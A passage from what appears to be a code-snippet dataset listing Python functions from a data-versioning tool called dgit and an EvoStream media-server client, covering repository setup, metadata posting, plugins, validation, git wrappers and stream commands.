            "def add(self, repo):\n        \"\"\"\n        Add repo to the internal lookup table...\n        \"\"\"\n        key = self.key(repo.username, repo.reponame)\n        repo.key = key\n        self.repos[key] = repo\n        return key"
        ],
        [
            "def lookup(username, reponame):\n    \"\"\"\n    Lookup a repo based on username reponame\n    \"\"\"\n\n    mgr = plugins_get_mgr()\n\n    # XXX This should be generalized to all repo managers.\n    repomgr = mgr.get(what='repomanager', name='git')\n    repo =  repomgr.lookup(username=username,\n                           reponame=reponame)\n    return repo"
        ],
        [
            "def shellcmd(repo, args):\n    \"\"\"\n    Run a shell command within the repo's context\n\n    Parameters\n    ----------\n\n    repo: Repository object\n    args: Shell command\n    \"\"\"\n    with cd(repo.rootdir):\n        result = run(args)\n        return result"
        ],
        [
            "def datapackage_exists(repo):\n    \"\"\"\n    Check if the datapackage exists...\n    \"\"\"\n    datapath = os.path.join(repo.rootdir, \"datapackage.json\")\n    return os.path.exists(datapath)"
        ],
        [
            "def bootstrap_datapackage(repo, force=False,\n                          options=None, noinput=False):\n    \"\"\"\n    Create the datapackage file..\n    \"\"\"\n\n    print(\"Bootstrapping datapackage\")\n\n    # get the directory\n    tsprefix = datetime.now().date().isoformat()\n\n    # Initial data package json\n    package = OrderedDict([\n        ('title', ''),\n        ('description', ''),\n        ('username', repo.username),\n        ('reponame', repo.reponame),\n        ('name', str(repo)),\n        ('title', \"\"),\n        ('description', \"\"),\n        ('keywords', []),\n        ('resources', []),\n        ('creator', getpass.getuser()),\n        ('createdat', datetime.now().isoformat()),\n        ('remote-url', repo.remoteurl)\n    ])\n\n    if options is not None:\n        package['title'] = options['title']\n        package['description'] = options['description']\n    else:\n        if noinput:\n            raise IncompleteParameters(\"Option field with title and description\")\n\n        for var in ['title', 'description']:\n            value = ''\n            while value in ['',None]:\n                value = input('Your Repo ' + var.title() + \": \")\n                if len(value) == 0:\n                    print(\"{} cannot be empty. Please re-enter.\".format(var.title()))\n\n            package[var] = value\n\n\n    # Now store the package...\n    (handle, filename) = tempfile.mkstemp()\n    with open(filename, 'w') as fd:\n        fd.write(json.dumps(package, indent=4))\n\n    repo.package = package\n\n    return filename"
        ],
        [
            "def init(username, reponame, setup,\n         force=False, options=None,\n         noinput=False):\n    \"\"\"\n    Initialize an empty repository with datapackage.json\n\n    Parameters\n    ----------\n\n    username: Name of the user\n    reponame: Name of the repo\n    setup: Specify the 'configuration' (git only, git+s3 backend etc)\n    force: Force creation of the files\n    options: Dictionary with content of dgit.json, if available.\n    noinput: Automatic operation with no human interaction\n    \"\"\"\n\n    mgr = plugins_get_mgr()\n    repomgr = mgr.get(what='repomanager', name='git')\n\n    backendmgr = None\n    if setup == 'git+s3':\n        backendmgr = mgr.get(what='backend', name='s3')\n\n    repo = repomgr.init(username, reponame, force, backendmgr)\n\n    # Now bootstrap the datapackage.json metadata file and copy it in...\n\n    # Insert a gitignore with .dgit directory in the repo. This\n    # directory will be used to store partial results\n    (handle, gitignore) = tempfile.mkstemp()\n    with open(gitignore, 'w') as fd:\n        fd.write(\".dgit\")\n\n    # Try to bootstrap. If you cant, cleanup and return\n    try:\n        filename = bootstrap_datapackage(repo, force, options, noinput)\n    except Exception as e:\n        repomgr.drop(repo,[])\n        os.unlink(gitignore)\n        raise e\n\n    repo.run('add_files',\n             [\n                 {\n                     'relativepath': 'datapackage.json',\n                     'localfullpath': filename,\n                 },\n                 {\n                     'relativepath': '.gitignore',\n                     'localfullpath': gitignore,\n                 },\n             ])\n\n\n    # Cleanup temp files\n    os.unlink(filename)\n    os.unlink(gitignore)\n\n    args = ['-a', '-m', 'Bootstrapped the repo']\n    repo.run('commit', args)\n    \n    return repo"
        ],
        [
            "def annotate_metadata_data(repo, task, patterns=[\"*\"], size=0):\n    \"\"\"\n    Update metadata with the content of the files\n    \"\"\"\n\n    mgr = plugins_get_mgr() \n    keys = mgr.search('representation')['representation']\n    representations = [mgr.get_by_key('representation', k) for k in keys]\n\n    matching_files = repo.find_matching_files(patterns)\n    package = repo.package\n    rootdir = repo.rootdir\n    files = package['resources']\n    for f in files:\n        relativepath = f['relativepath']\n        if relativepath in matching_files:\n            path = os.path.join(rootdir, relativepath)\n            if task == 'preview':\n                print(\"Adding preview for \", relativepath)\n                f['content'] = open(path).read()[:size]\n            elif task == 'schema':\n                for r in representations: \n                    if r.can_process(path): \n                        print(\"Adding schema for \", path)\n                        f['schema'] = r.get_schema(path)\n                        break"
        ],
        [
            "def annotate_metadata_code(repo, files):\n    \"\"\"\n    Update metadata with the commit information\n    \"\"\"\n\n    package = repo.package\n    package['code'] = []\n    for p in files:\n        matching_files = glob2.glob(\"**/{}\".format(p))\n        for f in matching_files:\n            absf = os.path.abspath(f)\n            print(\"Add commit data for {}\".format(f))\n            package['code'].append(OrderedDict([\n                ('script', f),\n                ('permalink', repo.manager.permalink(repo, absf)),\n                ('mimetypes', mimetypes.guess_type(absf)[0]),\n                ('sha256', compute_sha256(absf))\n            ]))"
        ],
        [
            "def annotate_metadata_action(repo):\n    \"\"\"\n    Update metadata with the action history \n    \"\"\"\n    package = repo.package    \n\n    print(\"Including history of actions\")\n    with cd(repo.rootdir): \n        filename = \".dgit/log.json\"        \n        if os.path.exists(filename):             \n            history = open(filename).readlines() \n            actions = []\n            for a in history: \n                try: \n                    a = json.loads(a)\n                    for x in ['code']: \n                        if x not in a or a[x] == None: \n                            a[x] = \"...\"\n                    actions.append(a)\n                except:\n                    pass \n            package['actions'] = actions"
        ],
        [
            "def annotate_metadata_platform(repo):\n    \"\"\"\n    Update metadata host information\n    \"\"\"\n\n    print(\"Added platform information\")\n    package = repo.package\n    mgr = plugins_get_mgr()\n    repomgr = mgr.get(what='instrumentation', name='platform')\n    package['platform'] = repomgr.get_metadata()"
        ],
        [
            "def annotate_metadata_dependencies(repo):\n    \"\"\"\n    Collect information from the dependent repo's\n    \"\"\"\n\n    options = repo.options\n\n    if 'dependencies' not in options:\n        print(\"No dependencies\")\n        return []\n\n    repos = []\n    dependent_repos = options['dependencies']\n    for d in dependent_repos:\n        if \"/\" not in d:\n            print(\"Invalid dependency specification\")\n        (username, reponame) = d.split(\"/\")\n        try:\n            repos.append(repo.manager.lookup(username, reponame))\n        except:\n            print(\"Repository does not exist. Please create one\", d)\n\n    package = repo.package\n    package['dependencies'] = []\n    for r in repos:\n        package['dependencies'].append({\n            'username': r.username,\n            'reponame': r.reponame,\n            })"
        ],
        [
            "def post(repo, args=[]):\n    \"\"\"\n    Post to metadata server\n\n    Parameters\n    ----------\n\n    repo: Repository object (result of lookup)\n    \"\"\"\n\n    mgr = plugins_get_mgr()\n    keys = mgr.search(what='metadata')\n    keys = keys['metadata']\n\n    if len(keys) == 0:\n        return\n\n    # Incorporate pipeline information...\n    if 'pipeline' in repo.options:\n        for name, details in repo.options['pipeline'].items():\n            patterns = details['files']\n            matching_files = repo.find_matching_files(patterns)\n            matching_files.sort()\n            details['files'] = matching_files\n            for i, f in enumerate(matching_files):\n                r = repo.get_resource(f)\n                if 'pipeline' not in r:\n                    r['pipeline'] = []\n                r['pipeline'].append(name + \" [Step {}]\".format(i))\n\n    if 'metadata-management' in repo.options:\n\n        print(\"Collecting all the required metadata to post\")\n        metadata = repo.options['metadata-management']\n\n        # Add data repo history\n        if 'include-data-history' in metadata and metadata['include-data-history']:\n            repo.package['history'] = get_history(repo.rootdir)\n\n        # Add action history \n        if 'include-action-history' in metadata and metadata['include-action-history']:\n            annotate_metadata_action(repo) \n\n        # Add data repo history\n        if 'include-preview' in metadata:\n            annotate_metadata_data(repo,\n                                   task='preview',\n                                   patterns=metadata['include-preview']['files'],\n                                   size=metadata['include-preview']['length'])\n\n        if (('include-schema' in metadata) and metadata['include-schema']):\n            annotate_metadata_data(repo,  task='schema')\n\n        if 'include-code-history' in metadata:\n            annotate_metadata_code(repo, files=metadata['include-code-history'])\n\n        if 'include-platform' in metadata:\n            annotate_metadata_platform(repo)\n\n        if 'include-validation' in metadata:\n            annotate_metadata_validation(repo)\n\n        if 'include-dependencies' in metadata:\n            annotate_metadata_dependencies(repo)\n\n        history = repo.package.get('history',None)\n        if (('include-tab-diffs' in metadata) and\n            metadata['include-tab-diffs'] and\n            history is not None):\n            annotate_metadata_diffs(repo)\n\n        # Insert options as well\n        repo.package['config'] = repo.options\n\n    try:\n        for k in keys:\n            # print(\"Key\", k)\n            metadatamgr = mgr.get_by_key('metadata', k)\n            url = metadatamgr.url\n            o = urlparse(url)\n            print(\"Posting to \", o.netloc)\n            response = metadatamgr.post(repo)\n            if isinstance(response, str):\n                print(\"Error while posting:\", response)\n            elif response.status_code in [400]:\n                content = response.json()\n                print(\"Error while posting:\")\n                for k in content:\n                    print(\"   \", k,\"- \", \",\".join(content[k]))\n    except NetworkError as e:\n        print(\"Unable to reach metadata server!\")\n    except NetworkInvalidConfiguration as e:\n        print(\"Invalid network configuration in the INI file\")\n        print(e.message)\n    except Exception as e:\n        print(\"Could not post. Unknown error\")\n        print(e)"
        ],
        [
            "def plugins_show(what=None, name=None, version=None, details=False):\n    \"\"\"\n    Show details of available plugins\n\n    Parameters\n    ----------\n    what: Class of plugins e.g., backend\n    name: Name of the plugin e.g., s3\n    version: Version of the plugin\n    details: Show details be shown?\n\n    \"\"\"\n    global pluginmgr\n    return pluginmgr.show(what, name, version, details)"
        ],
        [
            "def discover_all_plugins(self):\n        \"\"\"\n        Load all plugins from dgit extension\n        \"\"\"\n        for v in pkg_resources.iter_entry_points('dgit.plugins'):\n            m = v.load()\n            m.setup(self)"
        ],
        [
            "def register(self, what, obj):\n        \"\"\"\n        Registering a plugin\n\n        Params\n        ------\n        what: Nature of the plugin (backend, instrumentation, repo)\n        obj: Instance of the plugin\n        \"\"\"\n        # print(\"Registering pattern\", name, pattern)\n        name = obj.name\n        version = obj.version\n        enable = obj.enable\n        if enable == 'n':\n            return\n\n        key = Key(name, version)\n        self.plugins[what][key] = obj"
        ],
        [
            "def search(self, what, name=None, version=None):\n        \"\"\"\n        Search for a plugin\n        \"\"\"\n        filtered = {}\n\n        # The search may for a scan (what is None) or\n        if what is None:\n            whats = list(self.plugins.keys())\n        elif what is not None:\n            if what not in self.plugins:\n                raise Exception(\"Unknown class of plugins\")\n            whats = [what]\n        for what in whats:\n            if what not in filtered:\n                filtered[what] = []\n            for key in self.plugins[what].keys():\n                (k_name, k_version) = key\n                if name is not None and k_name != name:\n                    continue\n                if version is not None and k_version != version:\n                    continue\n                if self.plugins[what][key].enable == 'n':\n                    continue\n                filtered[what].append(key)\n\n        # print(filtered)\n        return filtered"
        ],
        [
            "def instantiate(repo, validator_name=None, filename=None, rulesfiles=None):\n    \"\"\"\n    Instantiate the validation specification\n    \"\"\"\n\n    default_validators = repo.options.get('validator', {})\n\n    validators = {}\n    if validator_name is not None:\n        # Handle the case validator is specified..\n        if validator_name in default_validators:\n            validators = {\n                validator_name : default_validators[validator_name]\n            }\n        else:\n            validators = {\n                validator_name : {\n                    'files': [],\n                    'rules': {},\n                    'rules-files': []\n                }\n            }\n    else:\n        validators = default_validators\n\n    #=========================================\n    # Insert the file names\n    #=========================================\n    if filename is not None:\n        matching_files = repo.find_matching_files([filename])\n        if len(matching_files) == 0:\n            print(\"Filename could not be found\", filename)\n            raise Exception(\"Invalid filename pattern\")\n        for v in validators:\n            validators[v]['files'] = matching_files\n    else:\n        # Instantiate the files from the patterns specified\n        for v in validators:\n            if 'files' not in validators[v]:\n                validators[v]['files'] = []\n            elif len(validators[v]['files']) > 0:\n                matching_files = repo.find_matching_files(validators[v]['files'])\n                validators[v]['files'] = matching_files\n\n    #=========================================\n    # Insert the rules files..\n    #=========================================\n    if rulesfiles is not None:\n        # Command lines...\n        matching_files = repo.find_matching_files([rulesfiles])\n        if len(matching_files) == 0:\n            print(\"Could not find matching rules files ({}) for {}\".format(rulesfiles,v))\n            raise Exception(\"Invalid rules\")\n        for v in validators:\n            validators[v]['rules-files'] = matching_files\n    else:\n        # Instantiate the files from the patterns specified\n        for v in validators:\n            if 'rules-files' not in validators[v]:\n                validators[v]['rules-files'] = []\n            else:\n                rulesfiles = validators[v]['rules-files']\n                matching_files = repo.find_matching_files(rulesfiles)\n                validators[v]['rules-files'] = matching_files\n\n    return validators"
        ],
        [
            "def validate(repo, \n             validator_name=None, \n             filename=None, \n             rulesfiles=None,\n             args=[]):\n    \"\"\"\n    Validate the content of the files for consistency. Validators can\n    look as deeply as needed into the files. dgit treats them all as\n    black boxes.\n\n    Parameters\n    ----------\n\n    repo: Repository object\n    validator_name: Name of validator, if any. If none, then all validators specified in dgit.json will be included.\n    filename: Pattern that specifies files that must be processed by the validators selected. If none, then the default specification in dgit.json is used.\n    rules: Pattern specifying the files that have rules that validators will use\n    show: Print the validation results on the terminal\n\n    Returns\n    -------\n\n    status: A list of dictionaries, each with target file processed, rules file applied, status of the validation and any error  message.\n    \"\"\"\n\n    mgr = plugins_get_mgr()\n\n    # Expand the specification. Now we have full file paths\n    validator_specs = instantiate(repo, validator_name, filename, rulesfiles)\n\n    # Run the validators with rules files...\n    allresults = []\n    for v in validator_specs:\n\n        keys = mgr.search(what='validator',name=v)['validator']\n        for k in keys:\n            validator = mgr.get_by_key('validator', k)\n            result = validator.evaluate(repo, \n                                        validator_specs[v],\n                                        args)\n            allresults.extend(result)\n\n    return allresults"
        ],
        [
            "def url_is_valid(self, url):\n        \"\"\"\n        Check if a URL exists\n        \"\"\"\n        # Check if the file system path exists...\n        if url.startswith(\"file://\"):\n            url = url.replace(\"file://\",\"\")\n\n        return os.path.exists(url)"
        ],
        [
            "def post(self, repo):\n        \"\"\"\n        Post to the metadata server\n\n        Parameters\n        ----------\n\n        repo\n        \"\"\"\n\n        datapackage = repo.package\n\n        url = self.url\n        token = self.token\n        headers = {\n            'Authorization': 'Token {}'.format(token),\n            'Content-Type': 'application/json'\n        }\n\n        try:\n            r = requests.post(url,\n                              data = json.dumps(datapackage),\n                              headers=headers)\n\n            return r\n        except Exception as e: \n            #print(e)\n            #traceback.print_exc()\n            raise NetworkError()\n        return \"\""
        ],
        [
            "def get_module_class(class_path):\n    \"\"\"\n    imports and returns module class from ``path.to.module.Class``\n    argument\n    \"\"\"\n    mod_name, cls_name = class_path.rsplit('.', 1)\n\n    try:\n        mod = import_module(mod_name)\n    except ImportError as ex:\n        raise EvoStreamException('Error importing module %s: '\n                                 '\"%s\"' % (mod_name, ex))\n\n    return getattr(mod, cls_name)"
        ],
        [
            "def find_executable_files():\n    \"\"\"\n    Find max 5 executables that are responsible for this repo.\n    \"\"\"\n    files = glob.glob(\"*\") + glob.glob(\"*/*\") + glob.glob('*/*/*')\n    files = filter(lambda f: os.path.isfile(f), files)\n    executable = stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH\n    final = []\n    for filename in files:\n        if os.path.isfile(filename):\n            st = os.stat(filename)\n            mode = st.st_mode\n            if mode & executable:\n                final.append(filename)\n                if len(final) > 5:\n                    break\n    return final"
        ],
        [
            "def auto_get_repo(autooptions, debug=False):\n    \"\"\"\n    Automatically get repo\n\n    Parameters\n    ----------\n\n    autooptions: dgit.json content\n\n    \"\"\"\n\n    # plugin manager\n    pluginmgr = plugins_get_mgr()\n\n    # get the repo manager\n    repomgr = pluginmgr.get(what='repomanager', name='git')\n\n    repo = None\n\n    try:\n        if debug:\n            print(\"Looking repo\")\n        repo = repomgr.lookup(username=autooptions['username'],\n                              reponame=autooptions['reponame'])\n    except:\n        # Clone the repo\n        try:\n            print(\"Checking and cloning if the dataset exists on backend\")\n            url = autooptions['remoteurl']\n            if debug:\n                print(\"Doesnt exist. trying to clone: {}\".format(url))\n            common_clone(url)\n            repo = repomgr.lookup(username=autooptions['username'],\n                                  reponame=autooptions['reponame'])\n            if debug:\n                print(\"Cloning successful\")\n        except:\n            # traceback.print_exc()\n            yes = input(\"Repo doesnt exist. Should I create one? [yN]\")\n            if yes == 'y':\n                setup = \"git\"\n                if autooptions['remoteurl'].startswith('s3://'):\n                    setup = 'git+s3'\n                repo = common_init(username=autooptions['username'],\n                                   reponame=autooptions['reponame'],\n                                   setup=setup,\n                                   force=True,\n                                   options=autooptions)\n\n                if debug:\n                    print(\"Successfully inited repo\")\n            else:\n                raise Exception(\"Cannot load repo\")\n\n    repo.options = autooptions\n\n    return repo"
        ],
        [
            "def get_files_to_commit(autooptions):\n    \"\"\"\n    Look through the local directory to pick up files to check\n    \"\"\"\n    workingdir = autooptions['working-directory']\n    includes = autooptions['track']['includes']\n    excludes = autooptions['track']['excludes']\n\n    # transform glob patterns to regular expressions\n    # print(\"Includes \", includes) \n    includes = r'|'.join([fnmatch.translate(x) for x in includes])\n    excludes = r'|'.join([fnmatch.translate(x) for x in excludes]) or r'$.'\n\n    matched_files = []\n    for root, dirs, files in os.walk(workingdir):\n\n        # print(\"Looking at \", files)\n\n        # exclude dirs\n        # dirs[:] = [os.path.join(root, d) for d in dirs]\n        dirs[:] = [d for d in dirs if not re.match(excludes, d)]\n\n        # exclude/include files\n        files = [f for f in files if not re.match(excludes, f)]\n        #print(\"Files after excludes\", files)\n        #print(includes) \n        files = [f for f in files if re.match(includes, f)]\n        #print(\"Files after includes\", files) \n        files = [os.path.join(root, f) for f in files]\n\n        matched_files.extend(files)\n\n    return matched_files"
        ],
        [
            "def auto_add(repo, autooptions, files):\n    \"\"\"\n    Cleanup the paths and add\n    \"\"\"\n    # Get the mappings and keys.\n    mapping = { \".\": \"\" }\n    if (('import' in autooptions) and\n        ('directory-mapping' in autooptions['import'])):\n        mapping = autooptions['import']['directory-mapping']\n\n    # Apply the longest prefix first...\n    keys = mapping.keys()\n    keys = sorted(keys, key=lambda k: len(k), reverse=True)\n\n    count = 0\n    params = []\n    for f in files:\n\n        # Find the destination\n        relativepath = f\n        for k in keys:\n            v = mapping[k]\n            if f.startswith(k + \"/\"):\n                #print(\"Replacing \", k)\n                relativepath = f.replace(k + \"/\", v)\n                break\n\n        # Now add to repository\n        count += files_add(repo=repo,\n                           args=[f],\n                           targetdir=os.path.dirname(relativepath))\n\n    return count"
        ],
        [
            "def pull_stream(self, uri, **kwargs):\n        \"\"\"\n        This will try to pull in a stream from an external source. Once a\n        stream has been successfully pulled it is assigned a 'local stream\n        name' which can be used to access the stream from the EMS.\n\n        :param uri: The URI of the external stream. Can be RTMP, RTSP or\n            unicast/multicast (d) mpegts\n        :type uri: str\n\n        :param keepAlive: If keepAlive is set to 1, the server will attempt to\n            reestablish connection with a stream source after a connection has\n            been lost. The reconnect will be attempted once every second\n            (default: 1 true)\n        :type keepAlive: int\n\n        :param localStreamName: If provided, the stream will be given this\n            name. Otherwise, a fallback techniques used to determine the stream\n            name (based on the URI)\n        :type localStreamName: str\n\n        :param forceTcp: If 1 and if the stream is RTSP, a TCP connection will\n            be forced. Otherwise the transport mechanism will be negotiated\n            (UDP or TCP) (default: 1 true)\n        :type forceTcp: int\n\n        :param tcUrl: When specified, this value will be used to set the TC URL\n            in the initial RTMP connect invoke\n        :type tcUrl: str\n\n        :param pageUrl: When specified, this value will be used to set the\n            originating web page address in the initial RTMP connect invoke\n        :type pageUrl: str\n\n        :param swfUrl: When specified, this value will be used to set the\n            originating swf URL in the initial RTMP connect invoke\n        :type swfUrl: str\n\n        :param rangeStart: For RTSP and RTMP connections. A value from which\n            the playback should start expressed in seconds. There are 2 special\n            values: -2 and -1. For more information, please read about\n            start/len parameters here:\n            http://livedocs.adobe.com/flashmediaserver/3.0/hpdocs/help.html?content=00000185.html\n        :type rangeStart: int\n\n        :param rangeEnd: The length in seconds for the playback. -1 is a\n            special value. For more information, please read about start/len\n            parameters here:\n            http://livedocs.adobe.com/flashmediaserver/3.0/hpdocs/help.html?content=00000185.html\n        :type rangeEnd: int\n\n        :param ttl: Sets the IP_TTL (time to live) option on the socket\n        :type ttl: int\n\n        :param tos: Sets the IP_TOS (Type of Service) option on the socket\n        :type tos: int\n\n        :param rtcpDetectionInterval: How much time (in seconds) should the\n            server wait for RTCP packets before declaring the RTSP stream as a\n            RTCP-less stream\n        :type rtcpDetectionInterval: int\n\n        :param emulateUserAgent: When specified, this value will be used as the\n            user agent string. It is meaningful only for RTMP\n        :type emulateUserAgent: str\n\n        :param isAudio: If 1 and if the stream is RTP, it indicates that the\n            currently pulled stream is an audio source. Otherwise the pulled\n            source is assumed as a video source\n        :type isAudio: int\n\n        :param audioCodecBytes: The audio codec setup of this RTP stream if it\n            is audio. Represented as hex format without '0x' or 'h'. For\n            example: audioCodecBytes=1190\n        :type audioCodecBytes: str\n\n        :param spsBytes: The video SPS bytes of this RTP stream if it is video.\n            It should be base 64 encoded.\n        :type spsBytes: str\n\n        :param ppsBytes: The video PPS bytes of this RTP stream if it is video.\n            It should be base 64 encoded\n        :type ppsBytes: str\n\n        :param ssmIp: The source IP from source-specific-multicast. Only usable\n            when doing UDP based pull\n        :type ssmIp: str\n\n        :param httpProxy: This parameter has two valid values: IP:Port - This\n            value combination specifies an RTSP HTTP Proxy from which the RTSP\n            stream should be pulled from Self - Specifying \"self\" as the value\n            implies pulling RTSP over HTTP\n        :type httpProxy: str\n\n        :link: http://docs.evostream.com/ems_api_definition/pullstream\n        \"\"\"\n        return self.protocol.execute('pullStream', uri=uri, **kwargs)"
        ],
        [
            "def record(self, localStreamName, pathToFile, **kwargs):\n        \"\"\"\n        Records any inbound stream. The record command allows users to record\n        a stream that may not yet exist. When a new stream is brought into\n        the server, it is checked against a list of streams to be recorded.\n\n        Streams can be recorded as FLV files, MPEG-TS files or as MP4 files.\n\n        :param localStreamName: The name of the stream to be used as input\n            for recording.\n        :type localStreamName: str\n\n        :param pathToFile: Specify path and file name to write to.\n        :type pathToFile: str\n\n        :param type: `ts`, `mp4` or `flv`\n        :type type: str\n\n        :param overwrite: If false, when a file already exists for the stream\n            name, a new file will be created with the next appropriate number\n            appended. If 1 (true), files with the same name will be\n            overwritten.\n        :type overwrite: int\n\n        :param keepAlive: If 1 (true), the server will restart recording every\n            time the stream becomes available again.\n        :type keepAlive: int\n\n        :param chunkLength: If non-zero the record command will start a new\n            recording file after ChunkLength seconds have elapsed.\n        :type chunkLength: int\n\n        :param waitForIDR: This is used if the recording is being chunked.\n            When true, new files will only be created on IDR boundaries.\n        :type waitForIDR: int\n\n        :param winQtCompat: Mandates 32bit header fields to ensure\n            compatibility with Windows QuickTime.\n        :type winQtCompat: int\n\n        :param dateFolderStructure: If set to 1 (true), folders will be\n            created with names in `YYYYMMDD` format. Recorded files will be\n            placed inside these folders based on the date they were created.\n        :type dateFolderStructure: int\n\n        :link: http://docs.evostream.com/ems_api_definition/record\n        \"\"\"\n        return self.protocol.execute('record',\n                                     localStreamName=localStreamName,\n                                     pathToFile=pathToFile, **kwargs)"
        ],
        [
            "def create_ingest_point(self, privateStreamName, publicStreamName):\n        \"\"\"\n        Creates an RTMP ingest point, which mandates that streams pushed into\n        the EMS have a target stream name which matches one Ingest Point\n        privateStreamName.\n\n        :param privateStreamName: The name that RTMP Target Stream Names must\n            match.\n        :type privateStreamName: str\n\n        :param publicStreamName: The name that is used to access the stream\n            pushed to the privateStreamName. The publicStreamName becomes the\n            streams localStreamName.\n        :type publicStreamName: str\n\n        :link: http://docs.evostream.com/ems_api_definition/createingestpoint\n        \"\"\"\n        return self.protocol.execute('createIngestPoint',\n                                     privateStreamName=privateStreamName,\n                                     publicStreamName=publicStreamName)"
        ],
        [
            "def instantiate(repo, name=None, filename=None):\n    \"\"\"\n    Instantiate the generator and filename specification\n    \"\"\"\n\n    default_transformers = repo.options.get('transformer', {})\n\n    # If a name is specified, then lookup the options from dgit.json\n    # if specfied. Otherwise it is initialized to an empty list of\n    # files.\n    transformers = {}\n    if name is not None:\n        # Handle the case generator is specified..\n        if name in default_transformers:\n            transformers = {\n                name : default_transformers[name]\n            }\n        else:\n            transformers = {\n                name : {\n                    'files': [],\n                }\n            }\n    else:\n        transformers = default_transformers\n\n    #=========================================\n    # Map the filename patterns to list of files\n    #=========================================\n    # Instantiate the files from the patterns specified\n    input_matching_files = None\n    if filename is not None:\n        input_matching_files = repo.find_matching_files([filename])\n\n    for t in transformers:\n        for k in transformers[t]:\n            if \"files\" not in k:\n                continue\n            if k == \"files\" and input_matching_files is not None:\n                # Use the files specified on the command line..\n                transformers[t][k] = input_matching_files\n            else:\n                # Try to match the specification\n                if transformers[t][k] is None or len(transformers[t][k]) == 0:\n                    transformers[t][k] = []\n                else:\n                    matching_files = repo.find_matching_files(transformers[t][k])\n                    transformers[t][k] = matching_files\n\n    return transformers"
        ],
        [
            "def _run(self, cmd):\n        \"\"\"\n        Helper function to run commands\n\n        Parameters\n        ----------\n        cmd : list\n              Arguments to git command\n        \"\"\"\n\n        # This is here in case the .gitconfig is not accessible for\n        # some reason. \n        environ = os.environ.copy() \n\n        environ['GIT_COMMITTER_NAME'] = self.fullname\n        environ['GIT_COMMITTER_EMAIL'] = self.email \n        environ['GIT_AUTHOR_NAME'] = self.fullname\n        environ['GIT_AUTHOR_EMAIL'] = self.email \n\n        cmd = [pipes.quote(c) for c in cmd]\n        cmd = \" \".join(['/usr/bin/git'] + cmd)\n        cmd += \"; exit 0\"\n        #print(\"Running cmd\", cmd)\n        try:\n            output = subprocess.check_output(cmd,\n                                             stderr=subprocess.STDOUT,\n                                             shell=True,\n                                             env=environ)\n        except subprocess.CalledProcessError as e:\n            output = e.output\n\n        output = output.decode('utf-8')\n        output = output.strip()\n        # print(\"Output of command\", output)\n        return output"
        ],
        [
            "def _run_generic_command(self, repo, cmd):\n        \"\"\"\n        Run a generic command within the repo. Assumes that you are\n        in the repo's root directory\n        \"\"\"\n        \n        result = None\n        with cd(repo.rootdir):\n            # Dont use sh. It is not collecting the stdout of all\n            # child processes.\n            output = self._run(cmd)\n            try:\n                result = {\n                    'cmd': cmd,\n                    'status': 'success',\n                    'message': output,\n                }\n            except Exception as e:\n                result = {\n                    'cmd': cmd,\n                    'status': 'error',\n                    'message': str(e)\n                }\n\n        return result"
        ],
        [
            "def init(self, username, reponame, force, backend=None):\n        \"\"\"\n        Initialize a Git repo\n\n        Parameters\n        ----------\n\n        username, reponame : Repo name is tuple (name, reponame)\n        force: force initialization of the repo even if exists\n        backend: backend that must be used for this (e.g. s3)\n        \"\"\"\n        key = self.key(username, reponame)\n\n        # In local filesystem-based server, add a repo\n        server_repodir = self.server_rootdir(username,\n                                             reponame,\n                                             create=False)\n\n        # Force cleanup if needed\n        if os.path.exists(server_repodir) and not force:\n            raise RepositoryExists()\n\n        if os.path.exists(server_repodir):\n            shutil.rmtree(server_repodir)\n        os.makedirs(server_repodir)\n\n        # Initialize the repo\n        with cd(server_repodir):\n            git.init(\".\", \"--bare\")\n\n        if backend is not None:\n            backend.init_repo(server_repodir)\n\n        # Now clone the filesystem-based repo\n        repodir = self.rootdir(username, reponame, create=False)\n\n        # Prepare it if needed\n        if os.path.exists(repodir) and not force:\n            raise Exception(\"Local repo already exists\")\n        if os.path.exists(repodir):\n            shutil.rmtree(repodir)\n        os.makedirs(repodir)\n\n        # Now clone...\n        with cd(os.path.dirname(repodir)):\n            git.clone(server_repodir, '--no-hardlinks')\n\n        url = server_repodir\n        if backend is not None:\n            url = backend.url(username, reponame)\n\n        repo = Repo(username, reponame)\n        repo.manager = self\n        repo.remoteurl = url\n        repo.rootdir = self.rootdir(username, reponame)\n\n        self.add(repo)\n        return repo"
        ],
        [
            "def delete(self, repo, args=[]):\n        \"\"\"\n        Delete files from the repo\n        \"\"\"\n\n        result = None\n        with cd(repo.rootdir):\n            try:\n                cmd = ['rm'] + list(args)\n                result = {\n                    'status': 'success',\n                    'message': self._run(cmd)\n                }\n            except Exception as e:\n                result = {\n                    'status': 'error',\n                    'message': str(e)\n                }\n\n            # print(result)\n            return result"
        ],
        [
            "def drop(self, repo, args=[]):\n        \"\"\"\n        Cleanup the repo\n        \"\"\"\n\n        # Clean up the rootdir\n        rootdir = repo.rootdir\n        if os.path.exists(rootdir):\n            print(\"Cleaning repo directory: {}\".format(rootdir))\n            shutil.rmtree(rootdir)\n\n        # Cleanup the local version of the repo (this could be on\n        # the server etc.\n        server_repodir = self.server_rootdir_from_repo(repo,\n                                                       create=False)\n        if os.path.exists(server_repodir):\n            print(\"Cleaning data from local git 'server': {}\".format(server_repodir))\n            shutil.rmtree(server_repodir)\n\n        super(GitRepoManager, self).drop(repo)\n\n        return {\n            'status': 'success',\n            'message': \"successful cleanup\"\n        }"
        ],
        [
            "def permalink(self, repo, path):\n        \"\"\"\n        Get the permalink to command that generated the dataset\n        \"\"\"\n\n        if not os.path.exists(path): \n            # print(\"Path does not exist\", path)\n            return (None, None) \n\n        # Get this directory\n        cwd = os.getcwd()\n\n        # Find the root of the repo and cd into that directory..\n        if os.path.isfile(path):\n            os.chdir(os.path.dirname(path))\n\n        rootdir = self._run([\"rev-parse\", \"--show-toplevel\"])\n        if \"fatal\" in rootdir:\n            # print(\"fatal\", rootdir)\n            return (None, None) \n\n        os.chdir(rootdir)\n        # print(\"Rootdir = \", rootdir)\n\n        # Now find relative path\n        relpath = os.path.relpath(path, rootdir)\n        # print(\"relpath = \", relpath)\n\n        # Get the last commit for this file\n        #3764cc2600b221ac7d7497de3d0dbcb4cffa2914\n        sha1 = self._run([\"log\", \"-n\", \"1\", \"--format=format:%H\", relpath])\n        # print(\"sha1 = \", sha1)\n\n        # Get the repo URL\n        #git@gitlab.com:pingali/simple-regression.git\n        #https://gitlab.com/kanban_demo/test_project.git\n        remoteurl = self._run([\"config\", \"--get\", \"remote.origin.url\"])\n        # print(\"remoteurl = \", remoteurl)\n\n        # Go back to the original directory...\n        os.chdir(cwd)\n\n        # Now match it against two possible formats of the remote url\n        # Examples\n        #https://help.github.com/articles/getting-permanent-links-to-files/\n        